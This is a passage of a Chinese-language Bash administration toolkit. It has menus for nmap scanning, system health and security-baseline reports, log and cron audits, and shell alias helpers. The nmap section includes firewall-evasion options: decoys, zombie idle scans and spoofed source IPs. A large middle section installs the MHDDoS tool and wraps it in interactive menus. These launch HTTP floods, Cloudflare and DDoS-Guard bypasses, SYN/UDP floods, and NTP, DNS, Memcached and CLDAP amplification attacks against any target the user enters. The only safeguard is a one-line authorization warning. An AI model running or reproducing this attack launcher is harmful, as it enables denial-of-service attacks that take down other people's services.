    sudo nmap -sV --version-intensity 9 "$target"
    log_operation "nmap高级" "版本探测: $target" "INFO"
}

nmap_script_scan() {
    echo -e "${BOLD}脚本扫描${NC}"
    check_nmap || return
    read -p "输入目标IP或域名: " target
    echo "可用的脚本类别:"
    echo "1. auth (认证相关)"
    echo "2. default (默认脚本)"
    echo "3. discovery (发现)"
    echo "4. dos (拒绝服务)"
    echo "5. exploit (漏洞利用)"
    echo "6. external (外部)"
    echo "7. fuzzer (模糊测试)"
    echo "8. intrusive (入侵性)"
    echo "9. malware (恶意软件)"
    echo "10. safe (安全)"
    echo "11. version (版本)"
    echo "12. vuln (漏洞)"
    read -p "输入类别编号 (可多选如 1,3,5): " categories
    [ -z "$categories" ] && categories="vuln"
    
    local script_arg=""
    IFS=',' read -ra cats <<< "$categories"
    for cat in "${cats[@]}"; do
        case $cat in
            1) script_arg="${script_arg},auth" ;;
            2) script_arg="${script_arg},default" ;;
            3) script_arg="${script_arg},discovery" ;;
            4) script_arg="${script_arg},dos" ;;
            5) script_arg="${script_arg},exploit" ;;
            6) script_arg="${script_arg},external" ;;
            7) script_arg="${script_arg},fuzzer" ;;
            8) script_arg="${script_arg},intrusive" ;;
            9) script_arg="${script_arg},malware" ;;
            10) script_arg="${script_arg},safe" ;;
            11) script_arg="${script_arg},version" ;;
            12) script_arg="${script_arg},vuln" ;;
        esac
    done
    script_arg=${script_arg#,}
    
    echo -e "${CYAN}执行: nmap --script=$script_arg $target${NC}"
    sudo nmap --script="$script_arg" "$target"
    log_operation "nmap高级" "脚本扫描: $target, 类别: $script_arg" "INFO"
}

nmap_firewall_evasion() {
    echo -e "${BOLD}防火墙规避扫描${NC}"
    check_nmap || return
    read -p "输入目标IP或域名: " target
    echo "选择规避技术:"
    echo "1. 分片扫描 (-f)"
    echo "2. 诱饵扫描 (-D)"
    echo "3. 空闲扫描 (-sI)"
    echo "4. 随机延迟 (--scan-delay)"
    echo "5. 伪造源IP (-S)"
    echo "6. 使用代理 (--proxies)"
    read -p "请选择: " evade
    case $evade in
        1) sudo nmap -f "$target" ;;
        2)
            read -p "输入诱饵IP列表 (逗号分隔): " decoys
            sudo nmap -D "$decoys" "$target"
            ;;
        3)
            read -p "输入僵尸主机IP: " zombie
            sudo nmap -sI "$zombie" "$target"
            ;;
        4)
            read -p "输入延迟毫秒数 (如 1000): " delay
            sudo nmap --scan-delay "$delay" "$target"
            ;;
        5)
            read -p "输入伪造源IP: " src_ip
            sudo nmap -S "$src_ip" "$target"
            ;;
        6)
            read -p "输入代理地址 (如 http://proxy:8080): " proxy
            sudo nmap --proxies "$proxy" "$target"
            ;;
        *) echo -e "${RED}无效选择${NC}" ;;
    esac
    log_operation "nmap高级" "防火墙规避: $target" "INFO"
}

nmap_performance() {
    echo -e "${BOLD}定时与性能优化${NC}"
    check_nmap || return
    read -p "输入目标IP或域名: " target
    echo "选择性能模式:"
    echo "1. 极速 (-T5)"
    echo "2. 正常 (-T3)"
    echo "3. 慢速 (-T1) 避免检测"
    echo "4. 自定义并行度"
    read -p "请选择: " perf
    case $perf in
        1) sudo nmap -T5 "$target" ;;
        2) sudo nmap -T3 "$target" ;;
        3) sudo nmap -T1 "$target" ;;
        4)
            read -p "输入最小并行度 (--min-hostgroup): " min_host
            read -p "输入最大并行度 (--max-hostgroup): " max_host
            sudo nmap --min-hostgroup "$min_host" --max-hostgroup "$max_host" "$target"
            ;;
        *) sudo nmap "$target" ;;
    esac
    log_operation "nmap高级" "性能优化: $target" "INFO"
}

nmap_output_convert() {
    echo -e "${BOLD}输出格式转换${NC}"
    read -p "输入nmap输出文件路径 (XML格式): " xmlfile
    if [ ! -f "$xmlfile" ]; then
        echo -e "${RED}文件不存在${NC}"
        return
    fi
    echo "选择转换格式:"
    echo "1. 转换为HTML"
    echo "2. 转换为文本表格"
    read -p "请选择: " fmt
    case $fmt in
        1)
            if ! command -v xsltproc &> /dev/null; then
                echo -e "${YELLOW}安装xsltproc...${NC}"
                eval "$PKG_INSTALL xsltproc"
            fi
            xsltproc -o "${xmlfile%.xml}.html" "$xmlfile"
            echo -e "${GREEN}已生成: ${xmlfile%.xml}.html${NC}"
            ;;
        2)
            if ! command -v jq &> /dev/null; then
                echo -e "${YELLOW}安装jq...${NC}"
                eval "$PKG_INSTALL jq"
            fi
            # 简单转换，使用nmap自身的XML到文本功能
            xsltproc -o /tmp/nmap_table.txt /usr/share/nmap/nmap.xsl "$xmlfile" 2>/dev/null
            echo -e "${GREEN}文本输出: /tmp/nmap_table.txt${NC}"
            head -20 /tmp/nmap_table.txt
            ;;
    esac
    log_operation "nmap高级" "输出转换: $xmlfile" "INFO"
}

install_zenmap() {
    echo -e "${BOLD}安装 Zenmap (Nmap GUI)${NC}"
    case "$PKG_MANAGER" in
        apt) sudo apt install -y zenmap ;;
        yum|dnf) sudo yum install -y zenmap ;;
        *) echo -e "${RED}请手动安装 zenmap${NC}" ;;
    esac
    if command -v zenmap &> /dev/null; then
        echo -e "${GREEN}Zenmap 安装成功，运行: sudo zenmap${NC}"
    fi
}
# ==================== MHDDoS 全功能模块 ====================
# 检查并安装 MHDDoS
install_mhddos() {
    if [ -d "$HOME/MHDDoS" ] && [ -f "$HOME/MHDDoS/start.py" ]; then
        return 0
    fi
    echo -e "${CYAN}正在安装 MHDDoS...${NC}"
    cd "$HOME"
    git clone https://github.com/MatrixTM/MHDDoS.git || {
        echo -e "${RED}克隆失败，请手动安装${NC}"
        return 1
    }
    cd MHDDoS
    pip3 install -r requirements.txt
    echo -e "${GREEN}MHDDoS 安装完成${NC}"
}

# MHDDoS 主菜单
mhddos_main_menu() {
    echo -e "${BOLD}MHDDoS 压力测试工具（全功能）${NC}"
    echo -e "${RED}警告: 仅限授权测试，非法使用后果自负${NC}"
    
    install_mhddos || return
    
    while true; do
        echo ""
        echo -e "${CYAN}请选择攻击类型:${NC}"
        echo "1. Layer7 (应用层) 攻击"
        echo "2. Layer4 (传输层) 攻击"
        echo "3. 工具 (CFIP/DNS 查询等)"
        echo "4. 停止所有攻击"
        echo "0. 返回上级"
        read -p "选择: " type_choice

        case $type_choice in
            1) mhddos_layer7_menu ;;
            2) mhddos_layer4_menu ;;
            3) mhddos_tools_menu ;;
            4) mhddos_stop_all ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}" ;;
        esac
    done
}

# 停止所有攻击
mhddos_stop_all() {
    echo -e "${CYAN}正在停止所有 MHDDoS 攻击进程...${NC}"
    pkill -f "python.*start.py"
    echo -e "${GREEN}已停止${NC}"
}

# Layer7 攻击方法菜单
mhddos_layer7_menu() {
    while true; do
        echo ""
        echo -e "${BOLD}Layer7 攻击方法${NC}"
        echo "可用的方法:"
        echo "1  GET          - GET 洪水"
        echo "2  POST         - POST 洪水"
        echo "3  OVH          - 绕过 OVH"
        echo "4  RHEX         - 随机十六进制"
        echo "5  STOMP        - 绕过验证码"
        echo "6  STRESS       - 高字节数据包"
        echo "7  DYN          - 随机子域名"
        echo "8  DOWNLOADER   - 慢速读取"
        echo "9  SLOW         - Slowloris"
        echo "10 HEAD         - HEAD 方法"
        echo "11 NULL         - 空用户代理"
        echo "12 COOKIE       - 随机 Cookie"
        echo "13 PPS          - 仅发送 GET 行"
        echo "14 EVEN         - 多请求头 GET"
        echo "15 GSB          - 绕过 Google Shield"
        echo "16 DGB          - 绕过 DDoS Guard"
        echo "17 AVB          - 绕过 Arvan Cloud"
        echo "18 BOT          - 模拟 Google 爬虫"
        echo "19 APACHE       - Apache 漏洞"
        echo "20 XMLRPC       - WordPress XMLRPC"
        echo "21 CFB          - 绕过 CloudFlare"
        echo "22 CFBUAM       - 绕过 CloudFlare UAM"
        echo "23 BYPASS       - 常规绕过"
        echo "24 BOMB         - 使用 bombardier"
        echo "25 KILLER       - 多线程瘫痪"
        echo "26 TOR          - 绕过洋葱路由"
        echo "0  返回"
        read -p "请选择方法编号: " method

        [ "$method" = "0" ] && return
        # 映射编号到方法名
        case $method in
            1) method_name="GET" ;;
            2) method_name="POST" ;;
            3) method_name="OVH" ;;
            4) method_name="RHEX" ;;
            5) method_name="STOMP" ;;
            6) method_name="STRESS" ;;
            7) method_name="DYN" ;;
            8) method_name="DOWNLOADER" ;;
            9) method_name="SLOW" ;;
            10) method_name="HEAD" ;;
            11) method_name="NULL" ;;
            12) method_name="COOKIE" ;;
            13) method_name="PPS" ;;
            14) method_name="EVEN" ;;
            15) method_name="GSB" ;;
            16) method_name="DGB" ;;
            17) method_name="AVB" ;;
            18) method_name="BOT" ;;
            19) method_name="APACHE" ;;
            20) method_name="XMLRPC" ;;
            21) method_name="CFB" ;;
            22) method_name="CFBUAM" ;;
            23) method_name="BYPASS" ;;
            24) method_name="BOMB" ;;
            25) method_name="KILLER" ;;
            26) method_name="TOR" ;;
            *) echo -e "${RED}无效选择${NC}"; continue ;;
        esac

        read -p "输入目标 URL (如 http://example.com): " target
        [ -z "$target" ] && { echo -e "${RED}目标不能为空${NC}"; continue; }
        read -p "输入线程数 (默认 100): " threads
        threads=${threads:-100}
        read -p "输入代理文件路径 (留空使用内置代理): " proxy_file

        cd "$HOME/MHDDoS"
        local cmd="python3 start.py $method_name $target $threads"
        [ -n "$proxy_file" ] && cmd="$cmd proxy.txt $proxy_file"
        echo -e "${YELLOW}执行命令: $cmd${NC}"
        if confirm_action "确认开始攻击？" "n"; then
            eval "$cmd"
        fi
        cd - > /dev/null
        break
    done
}

# Layer4 攻击方法菜单
mhddos_layer4_menu() {
    while true; do
        echo ""
        echo -e "${BOLD}Layer4 攻击方法${NC}"
        echo "可用的方法:"
        echo "1  TCP          - TCP 洪水"
        echo "2  UDP          - UDP 洪水"
        echo "3  SYN          - SYN 洪水"
        echo "4  OVH-UDP      - 绕过 OVH/UDP"
        echo "5  CPS          - 使用代理连接"
        echo "6  ICMP         - ICMP 洪水"
        echo "7  CONNECTION   - 保持连接"
        echo "8  VSE          - Valve Source 引擎"
        echo "9  TS3          - TeamSpeak 3"
        echo "10 FIVEM        - FiveM"
        echo "11 FIVEM-TOKEN  - FiveM Token"
        echo "12 MEM          - Memcached 放大"
        echo "13 NTP          - NTP 放大"
        echo "14 MCBOT        - Minecraft 机器人"
        echo "15 MINECRAFT    - Minecraft Ping"
        echo "16 MCPE         - Minecraft PE"
        echo "17 DNS          - DNS 放大"
        echo "18 CHAR         - Chargen 放大"
        echo "19 CLDAP        - CLDAP 放大"
        echo "20 ARD          - Apple Remote Desktop"
        echo "21 RDP          - RDP 放大"
        echo "0 返回"
        read -p "请选择方法编号: " method

        [ "$method" = "0" ] && return
        case $method in
            1) method_name="TCP" ;;
            2) method_name="UDP" ;;
            3) method_name="SYN" ;;
            4) method_name="OVH-UDP" ;;
            5) method_name="CPS" ;;
            6) method_name="ICMP" ;;
            7) method_name="CONNECTION" ;;
            8) method_name="VSE" ;;
            9) method_name="TS3" ;;
            10) method_name="FIVEM" ;;
            11) method_name="FIVEM-TOKEN" ;;
            12) method_name="MEM" ;;
            13) method_name="NTP" ;;
            14) method_name="MCBOT" ;;
            15) method_name="MINECRAFT" ;;
            16) method_name="MCPE" ;;
            17) method_name="DNS" ;;
            18) method_name="CHAR" ;;
            19) method_name="CLDAP" ;;
            20) method_name="ARD" ;;
            21) method_name="RDP" ;;
            *) echo -e "${RED}无效选择${NC}"; continue ;;
        esac

        read -p "输入目标 IP 或域名: " target
        [ -z "$target" ] && { echo -e "${RED}目标不能为空${NC}"; continue; }
        read -p "输入目标端口 (默认 80): " port
        port=${port:-80}
        read -p "输入线程数 (默认 100): " threads
        threads=${threads:-100}
        read -p "输入代理文件路径 (Layer4 通常不需要，留空): " proxy_file

        cd "$HOME/MHDDoS"
        local cmd="python3 start.py $method_name $target:$port $threads"
        [ -n "$proxy_file" ] && cmd="$cmd proxy.txt $proxy_file"
        echo -e "${YELLOW}执行命令: $cmd${NC}"
        if confirm_action "确认开始攻击？" "n"; then
            eval "$cmd"
        fi
        cd - > /dev/null
        break
    done
}

# 工具菜单
mhddos_tools_menu() {
    while true; do
        echo ""
        echo -e "${BOLD}MHDDoS 工具${NC}"
        echo "1  CFIP      - 查找 Cloudflare 真实 IP"
        echo "2  DNS       - 显示 DNS 记录"
        echo "3  TSSRV     - TeamSpeak SRV 解析"
        echo "4  PING      - Ping 服务器"
        echo "5  CHECK     - 检查网站状态"
        echo "6  DSTAT     - 显示网络流量统计"
        echo "0  返回"
        read -p "请选择工具: " tool

        [ "$tool" = "0" ] && return
        read -p "输入目标 (域名或 IP): " target
        [ -z "$target" ] && { echo -e "${RED}目标不能为空${NC}"; continue; }

        cd "$HOME/MHDDoS"
        case $tool in
            1) python3 start.py tools CFIP "$target" ;;
            2) python3 start.py tools DNS "$target" ;;
            3) python3 start.py tools TSSRV "$target" ;;
            4) python3 start.py tools PING "$target" ;;
            5) python3 start.py tools CHECK "$target" ;;
            6) python3 start.py tools DSTAT ;;
            *) echo -e "${RED}无效选择${NC}"; cd - > /dev/null; continue ;;
        esac
        cd - > /dev/null
        break
    done
}
# ==================== 系统深入检查 (完整实现) ====================
deep_inspection_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}系统深入检查${NC}"
        echo -e "${BLUE}1.${NC} 全面系统健康报告"
        echo -e "${BLUE}2.${NC} 安全基线检查"
        echo -e "${BLUE}3.${NC} 性能瓶颈分析"
        echo -e "${BLUE}4.${NC} 日志审计分析"
        echo -e "${BLUE}5.${NC} 内核参数评估"
        echo -e "${BLUE}6.${NC} 文件系统完整性"
        echo -e "${BLUE}7.${NC} 用户行为审计"
        echo -e "${BLUE}8.${NC} 定时任务检查"
        echo -e "${BLUE}9.${NC} 生成HTML报告"
        echo -e "${BLUE}0.${NC} 返回主菜单"
        read -p "请选择: " choice

        case $choice in
            1) deep_health_report ;;
            2) deep_security_baseline ;;
            3) deep_performance_analysis ;;
            4) deep_log_audit ;;
            5) deep_kernel_assessment ;;
            6) deep_filesystem_integrity ;;
            7) deep_user_audit ;;
            8) deep_cron_check ;;
            9) deep_generate_html_report ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}" ;;
        esac

        echo ""
        read -p "按回车键继续..."
    done
}

# 全面系统健康报告
deep_health_report() {
    echo -e "${BOLD}全面系统健康报告${NC}"
    local report_file="/tmp/health_report_$(date +%Y%m%d_%H%M%S).txt"
    
    {
        echo "========================================="
        echo "系统健康报告 - $(date)"
        echo "========================================="
        echo ""
        
        echo "【系统信息】"
        uname -a
        echo ""
        
        echo "【CPU使用率】"
        top -bn1 | grep "Cpu(s)" | awk '{print "CPU使用率: " $2 "%"}'
        echo "CPU负载: $(uptime | awk -F'load average:' '{print $2}')"
        echo ""
        
        echo "【内存使用】"
        free -h
        echo ""
        
        echo "【磁盘使用】"
        df -h | grep -E '^/dev/'
        echo ""
        
        echo "【磁盘Inode】"
        df -i | grep -E '^/dev/'
        echo ""
        
        echo "【网络连接数】"
        netstat -an | grep ESTABLISHED | wc -l
        echo ""
        
        echo "【系统日志错误】"
        journalctl -p 3 -b --no-pager | tail -20
        echo ""
        
        echo "【关键服务状态】"
        for service in sshd cron docker nginx mysql; do
            if systemctl is-active --quiet "$service" 2>/dev/null; then
                echo "✓ $service 运行中"
            else
                echo "✗ $service 未运行"
            fi
        done
        
        echo ""
        echo "【最近登录】"
        last -n 10
        echo ""
        
        echo "【系统运行时间】"
        uptime -p
        
    } > "$report_file"
    
    echo -e "${GREEN}健康报告已生成: $report_file${NC}"
    less "$report_file"
    log_operation "系统深入检查" "生成健康报告" "INFO"
}

# 安全基线检查
deep_security_baseline() {
    echo -e "${BOLD}安全基线检查${NC}"
    local baseline_file="/tmp/security_baseline_$(date +%Y%m%d_%H%M%S).txt"
    
    {
        echo "========================================="
        echo "安全基线检查报告 - $(date)"
        echo "========================================="
        echo ""
        
        echo "【密码策略】"
        if [ -f /etc/login.defs ]; then
            grep -E "PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE" /etc/login.defs
        else
            echo "未找到login.defs"
        fi
        echo ""
        
        echo "【SSH安全配置】"
        grep -E "PermitRootLogin|PasswordAuthentication|Protocol" /etc/ssh/sshd_config 2>/dev/null || echo "未找到SSH配置"
        echo ""
        
        echo "【SUID/SGID文件】"
        find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null | head -20
        echo ""
        
        echo "【世界可写文件】"
        find / -type f -perm -o+w -ls 2>/dev/null | head -20
        echo ""
        
        echo "【无属主文件】"
        find / -nouser -o -nogroup -ls 2>/dev/null | head -20
        echo ""
        
        echo "【防火墙状态】"
        if command -v ufw &> /dev/null; then
            ufw status verbose
        elif command -v iptables &> /dev/null; then
            iptables -L -n
        else
            echo "未启用防火墙"
        fi
        
        echo "【系统更新状态】"
        if command -v apt &> /dev/null; then
            apt list --upgradable 2>/dev/null | head -20
        elif command -v yum &> /dev/null; then
            yum check-update 2>/dev/null | head -20
        fi
        
    } > "$baseline_file"
    
    echo -e "${GREEN}安全基线报告已生成: $baseline_file${NC}"
    less "$baseline_file"
    log_operation "系统深入检查" "安全基线检查" "INFO"
}

# 性能瓶颈分析
deep_performance_analysis() {
    echo -e "${BOLD}性能瓶颈分析${NC}"
    
    echo -e "${CYAN}1. CPU瓶颈分析${NC}"
    echo "CPU等待队列:"
    sar -q 1 3 2>/dev/null || uptime
    echo ""
    echo "CPU上下文切换:"
    vmstat 1 3
    echo ""
    
    echo -e "${CYAN}2. 内存瓶颈分析${NC}"
    echo "内存使用详情:"
    cat /proc/meminfo | grep -E "MemTotal|MemFree|MemAvailable|SwapTotal|SwapFree"
    echo ""
    echo "内存页错误:"
    sar -B 1 3 2>/dev/null || echo "sar未安装"
    echo ""
    
    echo -e "${CYAN}3. 磁盘IO瓶颈分析${NC}"
    echo "磁盘IO统计:"
    iostat -x 1 2 2>/dev/null || echo "iostat未安装"
    echo ""
    echo "IO等待进程:"
    ps aux | awk '$8=="D" {print}' | head -10
    echo ""
    
    echo -e "${CYAN}4. 网络瓶颈分析${NC}"
    echo "网络流量统计:"
    sar -n DEV 1 2 2>/dev/null || echo "sar未安装"
    echo ""
    echo "网络错误统计:"
    netstat -i | grep -E 'Iface|errors'
    
    log_operation "系统深入检查" "性能瓶颈分析" "INFO"
}

# 日志审计分析
deep_log_audit() {
    echo -e "${BOLD}日志审计分析${NC}"
    
    echo "选择分析时间段:"
    echo "1. 最近1小时"
    echo "2. 最近24小时"
    echo "3. 最近7天"
    read -p "请选择: " period
    
    local since_arg=""
    case $period in
        1) since_arg="-1h" ;;
        2) since_arg="-24h" ;;
        3) since_arg="-7d" ;;
        *) since_arg="-24h" ;;
    esac
    
    echo -e "${CYAN}系统错误日志:${NC}"
    journalctl -p 3 --since="$since_arg" --no-pager | tail -50
    
    echo -e "\n${CYAN}认证失败日志:${NC}"
    journalctl _SYSTEMD_UNIT=sshd.service --since="$since_arg" | grep -i "Failed password" | tail -20
    
    echo -e "\n${CYAN}sudo使用记录:${NC}"
    journalctl _COMM=sudo --since="$since_arg" --no-pager | tail -20
    
    echo -e "\n${CYAN}内核消息:${NC}"
    dmesg | tail -30
    
    log_operation "系统深入检查" "日志审计" "INFO"
}

# 内核参数评估
deep_kernel_assessment() {
    echo -e "${BOLD}内核参数评估${NC}"
    
    echo -e "${CYAN}当前内核参数:${NC}"
    sysctl -a | grep -E "kernel.(hostname|osrelease|version)|vm.(swappiness|dirty)|net.ipv4.tcp" | head -30
    
    echo -e "\n${YELLOW}参数评估:${NC}"
    
    # 评估swappiness
    local swappiness=$(cat /proc/sys/vm/swappiness)
    if [ "$swappiness" -gt 30 ]; then
        echo "⚠ swappiness=$swappiness (建议10-30)"
    else
        echo "✓ swappiness=$swappiness"
    fi
    
    # 评估TCP时间戳
    local tcp_timestamps=$(cat /proc/sys/net/ipv4/tcp_timestamps)
    if [ "$tcp_timestamps" -eq 1 ]; then
        echo "✓ tcp_timestamps=1 (启用)"
    else
        echo "⚠ tcp_timestamps=0 (建议启用)"
    fi
    
    # 评估反向过滤
    local rp_filter=$(cat /proc/sys/net/ipv4/conf/all/rp_filter)
    if [ "$rp_filter" -eq 1 ]; then
        echo "✓ rp_filter=1 (启用反向路径过滤)"
    else
        echo "⚠ rp_filter=$rp_filter (建议启用)"
    fi
    
    # 评估SYN攻击防护
    local syn_cookies=$(cat /proc/sys/net/ipv4/tcp_syncookies)
    if [ "$syn_cookies" -eq 1 ]; then
        echo "✓ tcp_syncookies=1 (SYN Cookies启用)"
    else
        echo "⚠ tcp_syncookies=$syn_cookies (建议启用)"
    fi
    
    log_operation "系统深入检查" "内核参数评估" "INFO"
}

# 文件系统完整性
deep_filesystem_integrity() {
    echo -e "${BOLD}文件系统完整性检查${NC}"
    
    echo -e "${CYAN}检查关键文件哈希:${NC}"
    local critical_files=(
        "/bin/bash"
        "/bin/ls"
        "/bin/ps"
        "/bin/ss"
        "/sbin/init"
        "/etc/passwd"
        "/etc/shadow"
    )
    
    for file in "${critical_files[@]}"; do
        if [ -f "$file" ]; then
            hash=$(sha256sum "$file" | cut -d' ' -f1)
            echo "$file: $hash"
        fi
    done
    
    echo -e "\n${CYAN}检查文件系统挂载:${NC}"
    mount | grep -E 'ext4|xfs|btrfs'
    
    echo -e "\n${CYAN}检查文件系统错误:${NC}"
    dmesg | grep -i "error" | grep -i "filesystem" | tail -20
    
    echo -e "\n${CYAN}检查磁盘坏道:${NC}"
    sudo smartctl -H /dev/sda 2>/dev/null || echo "smartctl未安装或磁盘不支持"
    
    log_operation "系统深入检查" "文件系统完整性" "INFO"
}

# 用户行为审计
deep_user_audit() {
    echo -e "${BOLD}用户行为审计${NC}"
    
    echo -e "${CYAN}当前登录用户:${NC}"
    who
    
    echo -e "\n${CYAN}最近登录记录:${NC}"
    last -n 20
    
    echo -e "\n${CYAN}用户命令历史:${NC}"
    echo "root历史命令:"
    tail -20 /root/.bash_history 2>/dev/null || echo "无法访问"
    
    echo -e "\n${CYAN}sudo执行记录:${NC}"
    grep "sudo" /var/log/auth.log 2>/dev/null | tail -20 || \
    grep "sudo" /var/log/secure 2>/dev/null | tail -20
    
    echo -e "\n${CYAN}异常登录尝试:${NC}"
    grep "Failed password" /var/log/auth.log 2>/dev/null | tail -20 || \
    grep "Failed password" /var/log/secure 2>/dev/null | tail -20
    
    echo -e "\n${CYAN}用户计划任务:${NC}"
    for user in $(cut -f1 -d: /etc/passwd); do
        crontab -u "$user" -l 2>/dev/null | head -5 && echo "--- $user ---"
    done
    
    log_operation "系统深入检查" "用户行为审计" "INFO"
}

# 定时任务检查
deep_cron_check() {
    echo -e "${BOLD}定时任务检查${NC}"
    
    echo -e "${CYAN}系统级crontab:${NC}"
    cat /etc/crontab 2>/dev/null || echo "未找到"
    
    echo -e "\n${CYAN}cron.d目录:${NC}"
    ls -la /etc/cron.d/ 2>/dev/null || echo "目录不存在"
    
    echo -e "\n${CYAN}每小时任务:${NC}"
    ls -la /etc/cron.hourly/ 2>/dev/null || echo "目录不存在"
    
    echo -e "\n${CYAN}每日任务:${NC}"
    ls -la /etc/cron.daily/ 2>/dev/null || echo "目录不存在"
    
    echo -e "\n${CYAN}每周任务:${NC}"
    ls -la /etc/cron.weekly/ 2>/dev/null || echo "目录不存在"
    
    echo -e "\n${CYAN}每月任务:${NC}"
    ls -la /etc/cron.monthly/ 2>/dev/null || echo "目录不存在"
    
    echo -e "\n${CYAN}用户定时任务:${NC}"
    for user in $(cut -f1 -d: /etc/passwd | head -10); do
        echo "$user:"
        crontab -u "$user" -l 2>/dev/null | head -3
    done
    
    echo -e "\n${CYAN}systemd定时器:${NC}"
    systemctl list-timers --all --no-pager | head -20
    
    log_operation "系统深入检查" "定时任务检查" "INFO"
}

# 生成HTML报告
deep_generate_html_report() {
    echo -e "${BOLD}生成HTML报告${NC}"
    
    local html_file="$HOME/system_report_$(date +%Y%m%d_%H%M%S).html"
    
    {
        cat << EOF
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>系统深入检查报告</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        h1 { color: #333; border-bottom: 2px solid #4CAF50; }
        h2 { color: #4CAF50; margin-top: 30px; }
        pre { background: #fff; padding: 15px; border-radius: 5px; border: 1px solid #ddd; overflow: auto; }
        .good { color: green; }
        .warning { color: orange; }
        .bad { color: red; }
        .section { background: white; padding: 20px; margin: 20px 0; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
    </style>
</head>
<body>
    <h1>系统深入检查报告 - $(date)</h1>
    
    <div class="section">
        <h2>系统信息</h2>
        <pre>$(uname -a)</pre>
    </div>
    
    <div class="section">
        <h2>CPU信息</h2>
        <pre>$(lscpu | grep -E 'Model name|CPU\(s\)|MHz')</pre>
    </div>
    
    <div class="section">
        <h2>内存使用</h2>
        <pre>$(free -h)</pre>
    </div>
    
    <div class="section">
        <h2>磁盘使用</h2>
        <pre>$(df -h | grep -E '^/dev/')</pre>
    </div>
    
    <div class="section">
        <h2>网络连接</h2>
        <pre>$(ss -tuln | head -20)</pre>
    </div>
    
    <div class="section">
        <h2>服务状态</h2>
        <pre>$(systemctl list-units --type=service --state=running | head -20)</pre>
    </div>
    
    <div class="section">
        <h2>最近登录</h2>
        <pre>$(last -n 20)</pre>
    </div>
    
    <div class="section">
        <h2>系统负载</h2>
        <pre>$(uptime)</pre>
    </div>
    
    <div class="section">
        <h2>定时任务</h2>
        <pre>$(crontab -l 2>/dev/null | head -20 || echo "无用户定时任务")</pre>
    </div>
    
    <div class="section">
        <h2>系统日志错误</h2>
        <pre>$(journalctl -p 3 -b --no-pager | tail -30)</pre>
    </div>
    
    <div class="footer">
        <p>生成时间: $(date)</p>
    </div>
</body>
</html>
EOF
    } > "$html_file"
    
    echo -e "${GREEN}HTML报告已生成: $html_file${NC}"
    echo -e "${CYAN}请在浏览器中打开查看${NC}"
    log_operation "系统深入检查" "生成HTML报告" "INFO"
}

# ==================== 命令行效率 (完整实现) ====================
cli_efficiency_menu() {
    while true; do
        show_header
        echo -e "${BOLD}${GREEN}命令行效率工具${NC}"
        echo -e "${BLUE}1.${NC} 历史命令管理"
        echo -e "${BLUE}2.${NC} 别名管理"
        echo -e "${BLUE}3.${NC} 函数封装工具"
        echo -e "${BLUE}4.${NC} 快捷目录跳转"
        echo -e "${BLUE}5.${NC} 批量文件操作"
        echo -e "${BLUE}6.${NC} 命令模板生成器"
        echo -e "${BLUE}7.${NC} 管道数据处理"
        echo -e "${BLUE}8.${NC} 效率配置持久化"
        echo -e "${BLUE}0.${NC} 返回主菜单"
        read -p "请选择: " choice

        case $choice in
            1) cli_history_manager ;;
            2) cli_alias_manager ;;
            3) cli_function_tool ;;
            4) cli_directory_jump ;;
            5) cli_batch_operations ;;
            6) cli_command_template ;;
            7) cli_pipe_processor ;;
            8) cli_persist_config ;;
            0) return ;;
            *) echo -e "${RED}无效选择${NC}" ;;
        esac

        echo ""
        read -p "按回车键继续..."
    done
}

# 历史命令管理
cli_history_manager() {
    echo -e "${BOLD}历史命令管理${NC}"
    
    echo "选择操作:"
    echo "1. 查看最常用命令"
    echo "2. 搜索历史命令"
    echo "3. 清理重复历史"
    echo "4. 导出历史命令"
    read -p "请选择: " hist_choice
    
    case $hist_choice in
        1)
            echo -e "${CYAN}最常用命令TOP20:${NC}"
            history | awk '{print $2}' | sort | uniq -c | sort -rn | head -20
            ;;
        2)
            read -p "输入搜索关键词: " keyword
            history | grep "$keyword" | tail -50
            ;;
        3)
            echo -e "${CYAN}清理重复历史...${NC}"
            local temp_hist=$(mktemp)
            sort ~/.bash_history | uniq > "$temp_hist"
            mv "$temp_hist" ~/.bash_history
            echo -e "${GREEN}清理完成，剩余 $(wc -l < ~/.bash_history) 条记录${NC}"
            ;;
        4)
            local export_file="$HOME/history_export_$(date +%Y%m%d).txt"
            cp ~/.bash_history "$export_file"
            echo -e "${GREEN}历史已导出到: $export_file${NC}"
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            ;;
    esac
    
    log_operation "命令行效率" "历史命令管理" "INFO"
}

# 别名管理
cli_alias_manager() {
    echo -e "${BOLD}别名管理${NC}"
    
    echo "当前别名:"
    alias | sort
    
    echo -e "\n选择操作:"
    echo "1. 添加临时别名"
    echo "2. 添加永久别名"
    echo "3. 删除别名"
    echo "4. 导入别名文件"
    read -p "请选择: " alias_choice
    
    case $alias_choice in
        1)
            read -p "输入别名名称: " alias_name
            read -p "输入别名命令: " alias_cmd
            alias "$alias_name=$alias_cmd"
            echo -e "${GREEN}临时别名已添加${NC}"
            ;;
        2)
            read -p "输入别名名称: " alias_name
            read -p "输入别名命令: " alias_cmd
            echo "alias $alias_name='$alias_cmd'" >> "$EFFICIENCY_ALIASES_FILE"
            echo "alias $alias_name='$alias_cmd'" >> ~/.bashrc
            echo -e "${GREEN}永久别名已添加，下次登录生效${NC}"
            ;;
        3)
            read -p "输入要删除的别名名称: " alias_name
            unalias "$alias_name" 2>/dev/null
            sed -i "/alias $alias_name=/d" "$EFFICIENCY_ALIASES_FILE" 2>/dev/null
            sed -i "/alias $alias_name=/d" ~/.bashrc 2>/dev/null
            echo -e "${GREEN}别名已删除${NC}"
            ;;
        4)
            if [ -f "$EFFICIENCY_ALIASES_FILE" ]; then
                source "$EFFICIENCY_ALIASES_FILE"
                echo -e "${GREEN}别名文件已导入${NC}"
            else
                echo -e "${YELLOW}别名文件不存在${NC}"
            fi
            ;;
        *)
            echo -e "${RED}无效选择${NC}"
            ;;
    esac
    
    log_operation "命令行效率" "别名管理" "INFO"
}

# 函数封装工具
cli_function_tool() {
    echo -e "${BOLD}函数封装工具${NC}"
    
    echo "选择操作:"
    echo "1. 创建新函数"
    echo "2. 查看已定义函数"
    echo "3. 测试函数"
    echo "4. 导出函数"
